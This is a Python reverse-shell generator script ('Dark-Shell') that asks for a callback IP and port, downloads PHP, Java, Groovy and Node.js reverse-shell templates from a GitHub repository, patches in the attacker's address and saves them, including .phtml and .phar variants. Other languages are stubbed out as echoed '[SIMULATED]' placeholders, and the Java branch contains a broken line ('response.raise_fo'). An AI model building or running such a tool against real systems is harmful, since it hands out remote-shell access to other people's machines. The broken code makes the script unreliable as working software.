#!/usr/bin/env python3
from colorit import *
init_colorit()
import socket
import fcntl
import struct
import requests
import sys
import os
import base64
from prompt_toolkit import prompt
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.completion import WordCompleter

try:
    import pyperclip
    CLIP_AVAILABLE = True
except Exception:
    CLIP_AVAILABLE = False

peachorangetealwedding = {
    "peach": (245, 229, 225),   # rgb(245, 229, 225)
    "orange": (249, 180, 135),  # rgb(249, 180, 135)
    "teal": (66, 122, 118),     # rgb(66, 122, 118)
    "wedding": (23, 65, 67),    # rgb(23, 65, 67)
    "red": (255, 0, 0)
}

PROMPT_COLOR = peachorangetealwedding["teal"]

print(color("""
    _____             _           _____ _          _ _ 
    |  __ \           | |         / ____| |        | | |
    | |  | | __ _ _ __| | _______| (___ | |__   ___| | |
    | |  | |/ _` | '__| |/ /______\___ \| '_ \ / _ \ | |
    | |__| | (_| | |  |   <       ____) | | | |  __/ | |
    |_____/ \__,_|_|  |_|\_\     |_____/|_| |_|\___|_|_|     

Drink Coffe, Enjoy Generate Shell              by HIJACKED - V1.2 
""", peachorangetealwedding["red"]))

languages = [
    "bash", "mfikto", "perl", "perl-no-sh", "php", "rustcat", "python",
    "netcat", "powershell", "ruby", "java", "groovy", "awk", "nodejs",
    "socat", "ncat", "openssl"
]

PowerShell = ["powershell-1", "powershell-2", "powershell-3", "powershell-4"]
Python = ["python", "python2", "python3"]
PHP = ["php", "php1", "php2", "php3", "php4", "php5", "php6", "php7", "php8", "php9", "phtml", "phar"]

completer  = WordCompleter(languages, ignore_case=True)
completer1 = WordCompleter(PowerShell, ignore_case=True)
completer2 = WordCompleter(Python, ignore_case=True)
completer3 = WordCompleter(PHP, ignore_case=True)

def get_ip_address(interface_or_ip):
    try:
        socket.inet_aton(interface_or_ip)
        return interface_or_ip
    except Exception:
        pass
    try:
        return socket.gethostbyname(interface_or_ip)
    except Exception:
        pass
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ip_address = socket.inet_ntoa(fcntl.ioctl(
            sock.fileno(),
            0x8915,  
            struct.pack('256s', bytes(interface_or_ip[:15], 'utf-8'))
        )[20:24])
        return ip_address
    except Exception:
        return None

def valid_port(port_str):
    try:
        p = int(port_str)
        return 1 <= p <= 65535
    except Exception:
        return False
URL_PHP = "https://github.com/HIJACKED1/Reverse-Shells/raw/main/reverse-shell.php"
URL_GROOVY = "https://github.com/HIJACKED1/Reverse-Shells/raw/main/Shell.groovy"
URL_NODE = "https://github.com/HIJACKED1/Reverse-Shells/blob/main/node.js"
URL_JAVA = "https://github.com/HIJACKED1/Reverse-Shells/raw/main/shell.java"

shell_commands = {
    "awk": lambda ip,port: f"echo '[SIMULATED] awk reverse shell to {ip}:{port}'",
    "ruby": lambda ip,port: f"echo '[SIMULATED] ruby reverse shell to {ip}:{port}'",
    "rustcat": lambda ip,port: f"echo '[SIMULATED] rustcat to {ip}:{port}'",
    "bash": lambda ip,port: f"echo '[SIMULATED] bash reverse shell to {ip}:{port}'",
    "mfikto": lambda ip,port: f"echo '[SIMULATED] mfikto to {ip}:{port}'",
    "netcat": lambda ip,port: f"echo '[SIMULATED] netcat to {ip}:{port}'",
    "ncat": lambda ip,port: f"echo '[SIMULATED] ncat to {ip}:{port}'",
    "socat": lambda ip,port: f"echo '[SIMULATED] socat to {ip}:{port}'",
    "perl-no-sh": lambda ip,port: f"echo '[SIMULATED] perl-no-sh to {ip}:{port}'",
    "perl": lambda ip,port: f"echo '[SIMULATED] perl to {ip}:{port}'",
    "python": lambda ip,port: f"echo '[SIMULATED] python reverse shell to {ip}:{port}'",
    "python2": lambda ip,port: f"echo '[SIMULATED] python2 reverse shell to {ip}:{port}'",
    "python3": lambda ip,port: f"echo '[SIMULATED] python3 reverse shell to {ip}:{port}'",
    "powershell-1": lambda ip,port: f"echo '[SIMULATED] powershell-1 to {ip}:{port}'",
    "powershell-2": lambda ip,port: f"echo '[SIMULATED] powershell-2 to {ip}:{port}'",
    "powershell-3": lambda ip,port: f"echo '[SIMULATED] powershell-3 to {ip}:{port}'",
    "powershell-4": lambda ip,port: f"echo '[SIMULATED] powershell-4 to {ip}:{port}'",
}

format_to_extension = {
    "python3": "py",
    "python2": "py",
    "bash": "sh",
    "perl": "pl",
    "python": "py",
    "netcat": "sh",
    "perl-no-sh": "pl",
    "rustcat": "sh",
    "mfikto" : "sh",
    "powershell-1" : "ps1",
    "powershell-2":"ps1",
    "powershell-3" : "ps1",
    "powershell-4": "ps1",
    "awk":"awk",
    "ruby":"rb",
    "ncat":"sh",
    "socat":"sh",
    "php":"php",
    "php1":"php",
    "php2":"php",
    "php3":"php",
    "php4":"php",
    "php5":"php",
    "php6":"php",
    "php7":"php",
    "php8":"php",
    "php9":"php",
    "phtml":"phtml",
    "phar":"phar",
}
if __name__ == "__main__":
    while True:
        interface_name = input(color("[INFO] ", PROMPT_COLOR) + "Enter IP or Name-Interface: ")
        ip_address = get_ip_address(interface_name)
        if ip_address is not None:
            IP = ip_address
            break
        else:
            print(color("==> Incorrect Interface!!!", peachorangetealwedding["wedding"]))
    while True:
        PORT = input(color("[INFO] ", PROMPT_COLOR) + "Enter Your PORT: ")
        if valid_port(PORT):
            break
        else:
            print(color("==> Invalid PORT! Enter a number between 1 and 65535.", peachorangetealwedding["wedding"]))

    FILE_NAME = input(color("[INFO] ", PROMPT_COLOR) + "Enter Name File (Without Extension): ")
    print("\n")
    print("  ~) -"+color(" Bash        ", peachorangetealwedding["teal"])+"  ~) - "+color("Mfikto", peachorangetealwedding["teal"]))
    print("  ~) -"+color(" Perl        ", peachorangetealwedding["teal"])+"  ~) - "+color("Perl-No-Sh", peachorangetealwedding["teal"]))
    print("  ~) -"+color(" Php         ", peachorangetealwedding["teal"])+"  ~) - "+color("Rustcat", peachorangetealwedding["teal"]))
    print("  ~) -"+color(" Python      ", peachorangetealwedding["teal"])+"  ~) - "+color("Netcat", peachorangetealwedding["teal"]))
    print("  ~) -"+color(" Powershell  ", peachorangetealwedding["teal"])+"  ~) - "+color("Ruby", peachorangetealwedding["teal"]))
    print("  ~) -"+color(" Java        ", peachorangetealwedding["teal"])+"  ~) - "+color("Groovy", peachorangetealwedding["teal"]))
    print("  ~) -"+color(" Awk         ", peachorangetealwedding["teal"])+"  ~) - "+color("Nodejs", peachorangetealwedding["teal"]))
    print("  ~) -"+color(" Socat       ", peachorangetealwedding["teal"])+"  ~) - "+color("Ncat", peachorangetealwedding["teal"]))
    print("\n")
    EXTENSION = prompt(
        ANSI(color("[INFO] ", PROMPT_COLOR) + "Choose Your Language: "),
        completer=completer
    ).lower().strip()
    if EXTENSION == "nodejs":
        try:
            response = requests.get(URL_NODE, timeout=8)
            response.raise_for_status()
            remote_content = response.text
            modified_content = remote_content.replace("127.0.0.1", IP).replace("1234", PORT)
            file_path = f"{FILE_NAME}.js"
            with open(file_path, "w") as f:
                f.write(modified_content)
            print(color(f"The modified file has been saved as {file_path}", peachorangetealwedding["teal"]))
        except Exception as e:
            print(color(f"Failed to fetch or save Node template: {e}", peachorangetealwedding["wedding"]))
        sys.exit()

    if EXTENSION == "java":
        try:
            response = requests.get(URL_JAVA, timeout=8)
            response.raise_fo
            remote_content = response.text
            modified_content = remote_content.replace("127.0.0.1", IP).replace("1234", PORT)
            file_path = f"{FILE_NAME}.java"
            with open(file_path, "w") as f:
                f.write(modified_content)
            print(color(f"The modified file has been saved as {file_path}", peachorangetealwedding["teal"]))
        except Exception as e:
            print(color(f"Failed to fetch or save Java template: {e}", peachorangetealwedding["wedding"]))
        sys.exit()

    if EXTENSION == "groovy":
        try:
            response = requests.get(URL_GROOVY, timeout=8)
            response.raise_for_status()
            remote_content = response.text
            modified_content = remote_content.replace("127.0.0.1", IP).replace("1234", PORT)
            file_path = f"{FILE_NAME}.groovy"
            with open(file_path, "w") as f:
                f.write(modified_content)
            print(color(f"The modified file has been saved as {file_path}", peachorangetealwedding["teal"]))
        except Exception as e:
            print(color(f"Failed to fetch or save Groovy template: {e}", peachorangetealwedding["wedding"]))
        sys.exit()

    if EXTENSION == "php":
        print("  ~) -"+color(" php (choose: php, php1..php9, phtml, phar)", peachorangetealwedding["teal"]))
        print("\n")
        EX = prompt(
            ANSI(color("[INFO] ", peachorangetealwedding["teal"]) + "What PHP Variant are you using: "),
            completer=completer3
        ).lower().strip()
        if EX in ("phtml", "phar"):
            chosen_ext = EX
        elif EX.startswith("php"):
            chosen_ext = "php"
        else:
            chosen_ext = "php"

        try:
            response = requests.get(URL_PHP, timeout=8)
            response.raise_for_status()
            remote_content = response.text
            modified_content = remote_content.replace("127.0.0.1", IP).replace("1234", PORT)
            file_path = f"{FILE_NAME}.{chosen_ext}"
            with open(file_path, "w") as f:
                f.write(modified_content)
            print(color(f"The modified file has been saved as {file_path}", peachorangetealwedding["teal"]))
        except Exception as e:
            print(color(f"Failed to fetch or save PHP template: {e}", peachorangetealwedding["wedding"]))
        sys.exit()
    if EXTENSION == "powershell":
        print("  ~) -"+color(" PowerShell-1         ", peachorangetealwedding["teal"])+"  ~) - "+color("Powershell-2", peachorangetealwedding["teal"]))
        print("  ~) -"+color(" PowerShell-3         ", peachorangetealwedding["teal"])+"  ~) - "+color("Powershell-4 (TLS 'not write TLS')", peachorangetealwedding["teal"]))
        print("\n")
        EX = prompt(
            ANSI(color("[INFO] ", peachorangetealwedding["teal"]) + "What PowerShell Version are you using: "),
            completer=completer1
        ).lower().strip()
        EXTENSION = EX
    if EXTENSION == "python":
        print("  ~) -"+color(" Python         ", peachorangetealwedding["teal"])+"  ~) - "+color("Python2", peachorangetealwedding["teal"]))
        print("  ~) -"+color(" Python3         ", peachorangetealwedding["teal"]))
        print("\n")
        EX = prompt(
            ANSI(color("[INFO] ", peachorangetealwedding["teal"]) + "What Python Version are you using: "),
            completer=completer2
        ).lower().strip()
        EXTENSION = EX
    if EXTENSION in shell_commands:
        cmd = shell_commands[EXTENSION](IP, PORT)
        print("\n")
        actions = [
            "   Save to file",
            "   Print to screen",
            "   Copy to clipboard" + (" (pyperclip available)" if CLIP_AVAILABLE else " (pyperclip NOT available)"),
            "   Create base64 one-liner (echo | base64 -d)"
        ]
        for i, a in enumerate(actions, start=1):
            print(color(f"{i}) ", peachorangetealwedding["peach"]) + color(a, peachorangetealwedding["teal"]))
        print("\n")
        choice = input(color("[INFO] ", peachorangetealwedding["teal"]) + "Choose action (comma separated numbers allowed, e.g. 1,3): ")
        choices = {c.strip() for c in choice.split(',') if c.strip()}

        if '1' in choices:
            file_extension = format_to_extension.get(EXTENSION, 'txt')
            file_path = f"{FILE_NAME}.{file_extension}"
            try:
                with open(file_path, 'w') as f:
                    f.write(cmd + "\n")
                print(color(f"The modified file has been saved as {file_path}", peachorangetealwedding["red"]))
            except Exception as e:
                print(color(f"Failed to write file: {e}", peachorangetealwedding["teal"]))

        if '2' in choices:
            print(color('\n--- GENERATED (SIMULATED) SHELL ---\n', peachorangetealwedding["red"]))
            print(cmd)
            print(color('\n--- END ---\n', peachorangetealwedding["red"]))

        if '3' in choices:
            if CLIP_AVAILABLE:
                try:
                    pyperclip.copy(cmd)
                    print(color("Copied generated command to clipboard.", peachorangetealwedding["red"]))
                except Exception as e:
                    print(color(f"Failed to copy to clipboard: {e}", peachorangetealwedding["teal"]))
            else:
                print(color("pyperclip not installed. Install with: pip install pyperclip", peachorangetealwedding["red"]))

        if '4' in choices:
            try:
                b = base64.b64encode(cmd.encode()).decode()
                one_liner = f"echo {b} | base64 -d"
                print(color("Base64 one-liner (simulated):", peachorangetealwedding["red"]))
                print(one_liner)
            except Exception as e:
                print(color(f"Failed to create base64 one-liner: {e}", peachorangetealwedding["teal"]))

    else:
        print(color(f"Unsupported or unhandled option: {EXTENSION}", peachorangetealwedding["red"]))

    print(color("\n! Done. If you want additional templates or features, tell me what to add.", peachorangetealwedding["teal"]))

